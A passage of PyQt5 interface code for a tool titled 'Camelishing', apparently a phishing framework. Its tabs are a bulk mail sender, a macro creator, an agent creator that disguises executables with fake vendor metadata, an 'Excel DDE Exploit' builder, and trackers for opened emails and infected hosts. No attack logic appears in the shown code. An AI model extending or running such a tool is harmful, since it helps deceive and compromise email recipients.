        self.normalconnect = QtWidgets.QCheckBox(self.serverSetting)
        self.normalconnect.setGeometry(QtCore.QRect(30, 240, 131, 17))
        self.normalconnect.setFont(font)
        self.normalconnect.setObjectName("normalconnect")

        self.privateconnect = QtWidgets.QCheckBox(self.serverSetting)
        self.privateconnect.setGeometry(QtCore.QRect(30, 310, 131, 17))
        self.privateconnect.setFont(font)
        self.privateconnect.setObjectName("privateconnect")

        self.selectprivate = QtWidgets.QPushButton(self.serverSetting)
        self.selectprivate.setGeometry(QtCore.QRect(290, 340, 75, 23))
        self.selectprivate.setObjectName("selectprivate")
        self.selectprivate.setEnabled(False)
        self.selectprivate.clicked.connect(self.selectPrivate)


        icon6 = QtGui.QIcon()
        icon6.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\letter__open__post__openmail__mail__email__envelope-128.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.tabWidget.addTab(self.tab_7, icon6, "")
        MainWindow.setCentralWidget(self.centralwidget)
        self.actionSettings = QtWidgets.QAction(MainWindow)
        icon7 = QtGui.QIcon()
        icon7.addPixmap(QtGui.QPixmap(os.getcwd()+"\\ico\\settingApp.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.actionSettings.setIcon(icon7)
        self.actionSettings.setObjectName("actionSettings")
        self.actionOpenTrack_Setting = QtWidgets.QAction(MainWindow)
        self.actionOpenTrack_Setting.setIcon(icon6)
        self.actionOpenTrack_Setting.setObjectName("actionOpenTrack_Setting")
        self.actionnone = QtWidgets.QAction(MainWindow)
        self.actionnone.setObjectName("actionnone")
        self.agentopenlabel = QtWidgets.QLabel(self.tab_5)
        self.agentopenlabel.setGeometry(QtCore.QRect(640, 30, 615, 480))
        self.agentopenlabel.setObjectName("agentopenlabel")

        self.mailopenlabel = QtWidgets.QLabel(self.tab_5)
        self.mailopenlabel.setGeometry(QtCore.QRect(0, 30, 611, 480))
        self.mailopenlabel.setObjectName("mailopenlabel")
        self.privatekey = QtWidgets.QLineEdit(self.serverSetting)
        self.privatekey.setGeometry(QtCore.QRect(130, 340, 151, 20))
        self.privatekey.setObjectName("privatekey")
        self.privatekey.setEnabled(False)
        self.privatekey.setReadOnly(True)

        self.privatekeypass = QtWidgets.QLineEdit(self.serverSetting)
        self.privatekeypass.setGeometry(QtCore.QRect(130, 380, 151, 20))
        self.privatekeypass.setObjectName("privatekeypass")
        self.privatekeypass.setEnabled(False)
        self.privatekeypass.setEchoMode(QLineEdit.Password)

        self.retranslateUi(MainWindow)
        self.tabWidget.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        self.normalconnect.clicked.connect(self.sshpass.setEnabled)
        self.normalconnect.clicked.connect(self.privateconnect.setDisabled)

        self.privateconnect.clicked.connect(self.privatekey.setEnabled)
        self.privateconnect.clicked.connect(self.privatekeypass.setEnabled)
        self.privateconnect.clicked.connect(self.normalconnect.setDisabled)
        self.privateconnect.clicked.connect(self.selectprivate.setEnabled)
        self.privatestart = ""

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Camelishing"))
        MainWindow.setWindowIcon(QtGui.QIcon(os.getcwd()+"\\ico\\hook.png"))
        self.senderlabel.setText(_translate("MainWindow", "Mail Settings"))
        self.messagelabel.setText(_translate("MainWindow", "Message  : "))
        self.maillistlabel.setText(_translate("MainWindow", "Mail List :"))
        self.openmaillist.setText(_translate("MainWindow", "Open List"))
        self.attachment_2.setText(_translate("MainWindow", "Attachment  : "))
        self.openattach.setText(_translate("MainWindow", "Open File"))
        self.subjectlabel.setText(_translate("MainWindow", "Subject : "))
        self.mailstart.setText(_translate("MainWindow", "START"))
        self.threadlabel.setText(_translate("MainWindow", "Thread :"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab), _translate("MainWindow", "Mail Sender"))
        self.label_6.setText(_translate("MainWindow", "Filename :"))
        self.label_7.setText(_translate("MainWindow", "Save As :"))
        self.macroselectdir.setText(_translate("MainWindow", "Select Dir"))
        self.label_8.setText(_translate("MainWindow", "Agent Url :"))
        self.label_9.setText(_translate("MainWindow", "LineText :"))
        self.label_10.setText(_translate("MainWindow", "Button Text :"))
        self.label_11.setText(_translate("MainWindow", "Exapmle : Push Button"))
        self.label_12.setText(_translate("MainWindow", "Exapmle : workform"))
        self.label_15.setText(_translate("MainWindow", "Text Location :"))
        self.label_17.setText(_translate("MainWindow", "Button Location :"))
        self.label_19.setText(_translate("MainWindow", "Insert Image :"))
        self.opentrackstart.setText(_translate("MainWindow","Start"))
        self.privateconnect.setText(_translate("MainWindow","Private Connect"))
        self.macroselectimage.setText(_translate("MainWindow", "Select Image"))
        self.label_21.setText(_translate("MainWindow", "Image Location :"))
        self.label_18.setText(_translate("MainWindow", "Exapmle Location : A3"))
        self.macrocreate.setText(_translate("MainWindow", "CREATE MACRO"))
        self.groupBox_5.setTitle(_translate("MainWindow", "Example"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_2), _translate("MainWindow", "Macro Creator"))
        self.returnhostlabel.setText(_translate("MainWindow","HOST"))
        self.returnportlabel.setText(_translate("MainWindow", "PORT"))
        self.connectSettings.setTitle(_translate("MainWindow", "Connect Settings"))
        self.label_20.setText(_translate("MainWindow", "Host :"))
        self.label_22.setText(_translate("MainWindow", "Port :"))
        self.label_79.setText(_translate("MainWindow", "Local or Static Ip"))
        self.detailProperties.setTitle(_translate("MainWindow", "Detail Properties"))
        self.ddestart.setText(_translate("MainWindow", "Create DDE"))
        self.label_23.setText(_translate("MainWindow", "Company Name :"))
        self.label_24.setText(_translate("MainWindow", "File Description :"))
        self.label_25.setText(_translate("MainWindow", "File Version : "))
        self.label_26.setText(_translate("MainWindow", "Copyright :"))
        self.label_27.setText(_translate("MainWindow", "Original Filename :"))
        self.label_28.setText(_translate("MainWindow", "Product Name :"))
        self.label_29.setText(_translate("MainWindow", "Product Version :"))
        self.label_37.setText(_translate("MainWindow", "File Version :"))
        self.label_68.setText(_translate("MainWindow", "File Icon :"))
        self.fileicoselect.setText(_translate("MainWindow", "Select"))
        self.label_71.setText(_translate("MainWindow", "Nagato Security Client"))
        self.label_72.setText(_translate("MainWindow", "Nagato Project"))
        self.label_73.setText(_translate("MainWindow", "4.2"))
        self.label_74.setText(_translate("MainWindow", "Copyright 2004-2018"))
        self.label_75.setText(_translate("MainWindow", "Uygulama.exe"))
        self.label_76.setText(_translate("MainWindow", "Nagato"))
        self.label_77.setText(_translate("MainWindow", "3.11.1.0"))
        self.label_78.setText(_translate("MainWindow", "3.11.1.0"))
        self.label_80.setText(_translate("MainWindow", "Uygulama"))
        self.label_70.setText(_translate("MainWindow", "File Name :"))
        self.groupBox_6.setTitle(_translate("MainWindow", "Examples"))
        self.createagent.setText(_translate("MainWindow", "Create Agent"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_3), _translate("MainWindow", "Agent Creator"))
        self.exceldde.setTitle(_translate("MainWindow", "Excel DDE Exploit"))
        self.label_81.setText(_translate("MainWindow", "Agent Url :"))
        self.selectprivate.setText(_translate("MainWindow", "Select"))
        self.label_82.setText(_translate("MainWindow", "Agent Name  :"))
        self.label_83.setText(_translate("MainWindow", "Line Text  :"))
        self.label_84.setText(_translate("MainWindow", "Text Location  :"))
        self.label_85.setText(_translate("MainWindow", "Exapmle : A3"))
        self.label_86.setText(_translate("MainWindow", "Insert Image :"))
        self.label_87.setText(_translate("MainWindow", "Image Location :"))
        self.ddeimageselect.setText(_translate("MainWindow", "Select Image"))
        self.orthercheck.setText(_translate("MainWindow", "Orther Payload"))
        self.normalconnect.setText(_translate("MainWindow", "Normal Connect"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_4), _translate("MainWindow", "Office Vulnerable"))
        self.mailOpenTrack.setTitle(_translate("MainWindow", "Mail Open Track"))
        self.mailopenwidget.headerItem().setText(0, _translate("MainWindow", "Emails"))
        self.mailopenwidget.headerItem().setText(1, _translate("MainWindow", "Status"))
        self.agentOpenTrack.setTitle(_translate("MainWindow", "Agent Open Track"))
        self.agentOpenwidget.headerItem().setText(0, _translate("MainWindow", "Username"))
        self.agentOpenwidget.headerItem().setText(1, _translate("MainWindow", "Hostname"))
        self.agentOpenwidget.headerItem().setText(2, _translate("MainWindow", "Platform"))
        self.agentOpenwidget.headerItem().setText(3, _translate("MainWindow", "Open Time"))
        self.returnstart.setText(_translate("MainWindow", "Start"))
        self.privatelabel.setText(_translate("MainWindow", "Private Key :"))
        self.privatepasslabel.setText(_translate("MainWindow", "Passphrase :"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_6), _translate("MainWindow", "Return Information"))
        self.statisticgenerate.setText(_translate("MainWindow", "Generate"))
        self.statisticmailgenerate.setText(_translate("MainWindow","Generate"))
        self.label_34.setText(_translate("MainWindow", "Mail Open Statistic"))
        self.label_35.setText(_translate("MainWindow", "Agent Open Statistic"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_5), _translate("MainWindow", "Statistics Report"))
        self.smtpSetting.setTitle(_translate("MainWindow", "Smtp Settings"))
        self.label_30.setText(_translate("MainWindow", "Smtp Host :"))
        self.label_31.setText(_translate("MainWindow", "Smtp Port  :"))
        self.label_32.setText(_translate("MainWindow", "Mail Adress :"))
        self.label_33.setText(_translate("MainWindow", "Mail Password :"))
        self.serverSetting.setTitle(_translate("MainWindow", "Server Settings"))
        self.label_109.setText(_translate("MainWindow", "Password :"))
        self.label_110.setText(_translate("MainWindow", "SSH Port  :"))
        self.label_111.setText(_translate("MainWindow", "SSH Ip Adress :"))
        self.label_112.setText(_translate("MainWindow", "Access Log Path :"))
        self.label_113.setText(_translate("MainWindow", "Username :"))
        self.label_114.setText(_translate("MainWindow", "Url :"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.tab_7), _translate("MainWindow", "General Settings"))
        self.actionSettings.setText(_translate("MainWindow", "Mail Setting"))
        self.actionOpenTrack_Setting.setText(_translate("MainWindow", "Server Setting"))
        self.actionnone.setText(_translate("MainWindow", "none"))


if __name__ == '__main__':
    app = QApplication(sys.argv)
    app.setStyle('gtk+')
    app.setStyleSheet("b")
    win = Ui_MainWindow()
    cls = QMainWindow()
    win.setupUi(cls)
    cls.show()
    sys.exit(app.exec_())
